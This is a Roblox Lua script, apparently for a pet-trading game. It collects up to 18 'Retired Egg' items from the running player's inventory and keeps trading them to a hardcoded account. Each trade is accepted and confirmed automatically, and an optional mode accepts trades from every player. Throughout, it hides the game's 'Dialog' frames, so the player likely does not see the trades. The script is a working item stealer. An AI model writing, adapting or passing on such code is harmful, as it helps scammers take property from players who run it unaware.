-- 1Services
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Configuration
local MainAccUsername = {"Her0eXBuildera31"}
local TARGET_ITEM_NAME = "Retired Egg"
local TARGET_ITEM_FORM = "NORMAL"
local ForceReceiver = false
local targetFrameNames = {"Dialog"}

-- Remotes / modules
local API = ReplicatedStorage:WaitForChild("API")

local addItemRemote =
    API:WaitForChild("TradeAPI/AddItemToOffer")

local sendTradeRemote =
    ReplicatedStorage:FindFirstChild("TradeAPI/SendTradeRequest", true)

local tradeFunction =
    API:WaitForChild("TradeAPI/AcceptOrDeclineTradeRequest")

-- Everything that actually runs
task.spawn(function()

    -- ClientData
    local successClientData, ClientData = pcall(function()
        return require(
            ReplicatedStorage
                :WaitForChild("ClientModules")
                :WaitForChild("Core")
                :WaitForChild("ClientData")
        )
    end)

    if not successClientData or not ClientData then
        warn("Failed to load ClientData")
        return
    end

    -- KindDB
    local KindDB = require(
        ReplicatedStorage
            :WaitForChild("ClientDB")
            :WaitForChild("Inventory")
            :WaitForChild("KindDB")
    )

    --------------------------------------------------
    -- FUNCTIONS
    --------------------------------------------------

    local function getKindDisplayName(kind)
        local kindData = kind and KindDB[kind]

        return kindData
            and tostring(kindData.name or "")
            or ""
    end

    local function refreshPetEgg()
        local playerGui = LocalPlayer:FindFirstChild("PlayerGui")

        if not playerGui then
            return false
        end

        local fired = false

        for _, descendant in ipairs(playerGui:GetDescendants()) do
            if descendant:IsA("BindableEvent")
                and descendant.Name == "RefreshSelected" then

                pcall(function()
                    descendant:Fire()
                end)

                fired = true
            end
        end

        return fired
    end

    local function waitForInventoryReady()
        for _ = 1, 20 do
            local dataStore = ClientData.get_data()

            local playerData =
                dataStore
                and (dataStore[LocalPlayer] or dataStore[LocalPlayer.Name])

            if playerData
                and playerData.inventory
                and playerData.inventory.pets then

                return true
            end

            task.wait(0.1)
        end

        return false
    end

    local function getMultipleUniqueIdsByName(itemName, itemForm, limit)
        local dataStore = ClientData.get_data()

        local playerData =
            dataStore
            and (dataStore[LocalPlayer] or dataStore[LocalPlayer.Name])

        if not playerData
            or not playerData.inventory
            or not playerData.inventory.pets then

            return {}
        end

        local uniqueIds = {}

        local formLower =
            string.lower(tostring(itemForm or ""))

        local targetNameLower =
            string.lower(tostring(itemName or ""))

        for uniqueId, itemData in pairs(playerData.inventory.pets) do
            if itemData and itemData.kind then

                local displayName =
                    getKindDisplayName(itemData.kind)

                local displayLower =
                    string.lower(displayName)

                local kindLower =
                    string.lower(tostring(itemData.kind))

                local nameMatches =
                    displayLower == targetNameLower
                    or kindLower == targetNameLower

                if nameMatches then
                    local properties =
                        itemData.properties or {}

                    local isNeon =
                        properties.neon == true

                    local isMegaNeon =
                        properties.mega_neon == true

                    local matchesForm =
                        (formLower == "neon"
                            and isNeon
                            and not isMegaNeon)

                        or

                        (formLower == "mega"
                            and isMegaNeon)

                        or

                        (formLower == "normal"
                            and not isNeon
                            and not isMegaNeon)

                    if matchesForm then
                        table.insert(uniqueIds, uniqueId)

                        if #uniqueIds >= limit then
                            break
                        end
                    end
                end
            end
        end

        return uniqueIds
    end

    local function sendTradeRequest(playerName)
        local targetPlayer =
            Players:FindFirstChild(playerName)

        if not targetPlayer then
            return false
        end

        -- Refresh before the next trade.
        refreshPetEgg()

        task.wait(0.5)

        if not waitForInventoryReady() then
            return false
        end

        if sendTradeRemote
            and sendTradeRemote:IsA("RemoteEvent") then

            local success = pcall(function()
                sendTradeRemote:FireServer(targetPlayer)
            end)

            if success then
                task.wait(5)
                return true
            end
        end

        return false
    end

    local function acceptTradeForAll()
        for _, targetPlayer in ipairs(Players:GetPlayers()) do
            if targetPlayer ~= LocalPlayer then

                pcall(function()
                    tradeFunction:InvokeServer(
                        targetPlayer,
                        true
                    )
                end)
            end
        end
    end

    --------------------------------------------------
    -- TRADE CYCLE
    --------------------------------------------------

    local AcceptNeg =
        API:WaitForChild("TradeAPI/AcceptNegotiation")

    local ConfirmTrade =
        API:WaitForChild("TradeAPI/ConfirmTrade")

    local function addSelectedItems()
        local uniqueIds =
            getMultipleUniqueIdsByName(
                TARGET_ITEM_NAME,
                TARGET_ITEM_FORM,
                18
            )

        if #uniqueIds == 0 then
            warn(
                "[TRADE] No matching items found:",
                TARGET_ITEM_NAME,
                TARGET_ITEM_FORM
            )
            return false
        end

        local addedCount = 0

        for _, uniqueId in ipairs(uniqueIds) do
            local success, err = pcall(function()
                addItemRemote:FireServer(uniqueId)
            end)

            if success then
                addedCount += 1
            else
                warn(
                    "[TRADE] AddItemToOffer failed:",
                    uniqueId,
                    err
                )
            end

            task.wait(0.1)
        end

        -- Give all AddItemToOffer calls time to register.
        task.wait(1)

        return addedCount > 0
    end

    local function runTradeCycle(playerName)
        local targetPlayer =
            Players:FindFirstChild(playerName)

        if not targetPlayer then
            return false
        end

        --------------------------------------------------
        -- 1. Refresh before sending the next trade
        --------------------------------------------------

        refreshPetEgg()
        task.wait(0.5)

        if not waitForInventoryReady() then
            warn("[TRADE] Inventory was not ready.")
            return false
        end

        --------------------------------------------------
        -- 2. Send trade request
        --------------------------------------------------

        if not sendTradeRemote
            or not sendTradeRemote:IsA("RemoteEvent") then

            warn("[TRADE] SendTradeRequest remote not found.")
            return false
        end

        local requestSuccess = pcall(function()
            sendTradeRemote:FireServer(targetPlayer)
        end)

        if not requestSuccess then
            warn("[TRADE] Failed to send trade request.")
            return false
        end

        --------------------------------------------------
        -- 3. Wait for trade window
        --------------------------------------------------

        task.wait(2)

        --------------------------------------------------
        -- 4. Refresh again after the trade opens
        --------------------------------------------------

        refreshPetEgg()
        task.wait(0.5)

        if not waitForInventoryReady() then
            warn("[TRADE] Inventory was not ready after trade opened.")
            return false
        end

        --------------------------------------------------
        -- 5. Add pets / eggs
        --------------------------------------------------

        if not addSelectedItems() then
            warn("[TRADE] Nothing was added to the trade.")
            return false
        end

        --------------------------------------------------
        -- 6. Script2-style negotiation timer
        --------------------------------------------------

        -- 1 second after AddItemToOffer finishes.
        task.wait(1)

        pcall(function()
            AcceptNeg:FireServer()
        end)

        -- Script2 timing.
        task.wait(0.5)

        pcall(function()
            ConfirmTrade:FireServer()
        end)

        --------------------------------------------------
        -- 7. Wait for trade completion
        --------------------------------------------------

        task.wait(4)

        return true
    end

    --------------------------------------------------
    -- OUTGOING TRADE LOOP
    --------------------------------------------------

    task.spawn(function()
        local currentTargetIndex = 1

        while true do
            if MainAccUsername
                and #MainAccUsername > 0 then

                if currentTargetIndex > #MainAccUsername then
                    currentTargetIndex = 1
                end

                local playerName =
                    MainAccUsername[currentTargetIndex]

                if playerName and playerName ~= "" then
                    if Players:FindFirstChild(playerName) then

                        local completed =
                            runTradeCycle(playerName)

                        if completed then
                            currentTargetIndex += 1
                        end
                    else
                        currentTargetIndex += 1
                    end
                else
                    currentTargetIndex += 1
                end
            end

            task.wait(0.5)
        end
    end)

    --------------------------------------------------
    -- FORCE RECEIVER
    --------------------------------------------------

    task.spawn(function()
        local ForceAcceptNeg =
            API:WaitForChild("TradeAPI/AcceptNegotiation")

        local ForceConfirmTrade =
            API:WaitForChild("TradeAPI/ConfirmTrade")

        while true do
            if ForceReceiver then
                acceptTradeForAll()

                task.wait(1)

                pcall(function()
                    ForceAcceptNeg:FireServer()
                end)

                task.wait(0.5)

                pcall(function()
                    ForceConfirmTrade:FireServer()
                end)

                -- Cooldown prevents remote spam.
                task.wait(4)
            else
                task.wait(1)
            end
        end
    end)

    --------------------------------------------------
    -- HIDE DIALOG
    --------------------------------------------------

    local PlayerGui =
        LocalPlayer:WaitForChild("PlayerGui")

    local framesToHide = {}

    for _, name in ipairs(targetFrameNames) do
        framesToHide[name] = true
    end

    while true do
        for _, gui in ipairs(PlayerGui:GetDescendants()) do
            if gui:IsA("Frame")
                and framesToHide[gui.Name]
                and gui.Visible then

                gui.Visible = false
            end
        end

        task.wait(3)
    end
end)
